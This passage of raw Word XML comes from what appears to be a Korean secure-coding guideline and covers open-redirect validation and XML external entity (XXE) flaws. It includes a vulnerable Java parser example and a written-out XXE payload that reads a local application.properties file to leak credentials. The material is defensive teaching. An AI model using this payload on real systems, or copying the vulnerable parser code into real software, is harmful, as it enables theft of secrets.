            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검사</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>List&lt;String&gt; allowedDomains = Arrays.asList("bkr.kr", "bkrcard.com");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String url = request.getParameter("returnUrl");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String host = new URL(url).getHost();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">if (!allowedDomains.contains(host)) url = "/main";  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>기본</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>경로로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>대체</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>response.sendRedirect(url);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  8. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>부적절한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> XML </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>외부개체</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>참조</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(XXE)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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로컬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정적</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DTD</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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사용하도록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설정하고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외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DTD</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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완전히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비활성화한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>각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파서의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외부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엔티티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처리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기능을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명시적으로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비활성화한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>엔티티</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기본</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>활성화된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>DocumentBuilder db = dbf.newDocumentBuilder();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">Document doc = db.parse(xmlInput);  // XXE </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>공격</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">XML </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>입력에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> &lt;!DOCTYPE x [&lt;!ENTITY xxe SYSTEM "file:///C:/application.properties"&gt;]&gt; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>삽입하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파서가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>로컬</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파일을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>읽어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>응답에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>포함시킵니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">·API </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>키</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>민감</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>유출되며</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>, SSRF</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>와</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결합하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>네트워크</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스캔도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRPr="002D3108" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
